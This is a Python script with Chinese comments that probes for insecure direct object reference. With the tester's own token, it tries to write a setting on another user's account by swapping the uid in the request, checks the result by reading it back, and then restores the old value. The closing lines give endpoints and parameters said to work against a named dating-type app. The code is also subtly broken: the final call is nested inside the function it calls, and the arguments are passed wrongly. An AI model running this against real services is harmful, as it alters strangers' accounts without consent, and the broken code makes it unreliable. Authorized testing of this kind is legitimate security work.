#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
授权态「归属校验」探针（ownership probe）
用途：拿到一个**自有**有效会话凭证后，判断写接口的写入目标由谁决定：
  (a) body 里的 uid 生效      → 越权写他人（critical）
  (b) 按 token 解析、忽略 body → 归属校验正确
  (c) 直接拒绝

设计要点（这些是踩过的坑）：
1) 不要用破坏性字段试写：用「可回滚、有默认值、有读回接口」的开关型字段
   （如 letterRemind / 提醒开关），不要用 selfIntroduction/头像/昵称这类
   不可逆或会覆盖的字段，也不要用覆盖式更新接口（缺字段会被清空）。
2) 必须先读到基线，写后读回，再改回基线，三步都要落证据。
3) 每个字段做「两次对照组」：一次 uid=自己、一次 uid=第三人，
   只有两次结果不同才能证明 uid 参与了写入决策。
4) 遇到 200 不代表写成功：「请求成功」可能是业务层空转（身份取不到 → 0 行更新）。
   一律以读回 oracle 为准。
"""
import time, json, requests
# ---- 参数守卫（无参数必须给出人话，不抛 traceback、不朝真实目标发包）----
import sys as _sys, os as _os
if len(_sys.argv) < 2:
    _u = '<参数...>'
    print("用法: " + _os.path.basename(__file__) + " " + _u, file=_sys.stderr)
    raise SystemExit(1)
# ---- 守卫结束 ----


BASE  = "https://TARGET/"          # 网关前缀，结尾带 /
TOKEN = "<YOUR_OWN_VALID_TOKEN>"   # 自有账号有效凭证
SELF  = "<YOUR_OWN_UID>"
OTHER = "1000"                     # 对照用的第三方 uid（挑公开种子号/测试号）
H = {"User-Agent": "Mozilla/5.0 (Linux; Android 13) Chrome/126.0 Mobile Safari/537.36",
     "Content-Type": "application/x-www-form-urlencoded", "token": TOKEN}
PAUSE = 1.6

def post(path, data):
    r = requests.post(BASE + path, data=data, headers=H, timeout=20)
    time.sleep(PAUSE)
    try:    return r.status_code, r.json()
    except: return r.status_code, {"_raw": r.text[:300]}

def read_field(uid, path, field, **extra):
    """读回 oracle：把你关心的那个字段单独取出来"""
    body = {"ruid": uid}; body.update(extra)
    _, j = post(path, body)
    d = (j.get("data") or {})
    return d.get(field) if isinstance(d, dict) else None

def probe(write_path, read_path, field, other_uid=OTHER, **extra):
    base_self  = read_field(SELF,  read_path, field, **extra)
    base_other = read_field(other_uid, read_path, field, **extra)
    print("基线  self=%r  other=%r" % (base_self, base_other))
    if base_self is None:
        print("!! 基线取不到，先修 read_path/参数名，别往下打"); return

    probe_val = 0 if base_self != 0 else 1     # 挑一个与基线不同的无害值

    # 对照组 1：uid=自己（确认接口在授权态下真的会写）
    post(write_path, {"uid": SELF, field: probe_val, **extra})
    hit_self = read_field(SELF, read_path, field, **extra) == probe_val
    print("对照组1 uid=self -> %s（真写=%s）" % (probe_val, hit_self))
    if hit_self:
        post(write_path, {"uid": SELF, field: base_self, **extra})   # 立刻恢复
        print("  已恢复 self=%r" % read_field(SELF, read_path, field, **extra))
    if not hit_self:
        print("=> 接口在授权态下也不写这个字段：字段名/形态不对，或需要别的必填项，换字段重来")
        return

    # 对照组 2：uid=他人（判据 a/b/c）
    post(write_path, {"uid": other_uid, field: probe_val, **extra})
    v_other = read_field(other_uid, read_path, field, **extra)
    v_self  = read_field(SELF,      read_path, field, **extra)
    print("对照组2 uid=other -> other=%r  self=%r" % (v_other, v_self))
    if v_other == probe_val:
        print("=> (a) 越权写他人！立刻改回 %r" % base_other)
        post(write_path, {"uid": other_uid, field: base_other, **extra})
        print("  恢复后 other=%r" % read_field(other_uid, read_path, field, **extra))
    elif v_self == probe_val:
        print("=> (b) 归属校验正确：body uid 被忽略，按 token 解析")
        post(write_path, {"uid": SELF, field: base_self, **extra})
    else:
        print("=> (c) 被拒绝或空转")

    # 一线姻缘实测可用的一组参数：
    probe(write_path="user/updateUser",
          read_path="user/getUserById",
          field="letterRemind", extra={"type": "0"})
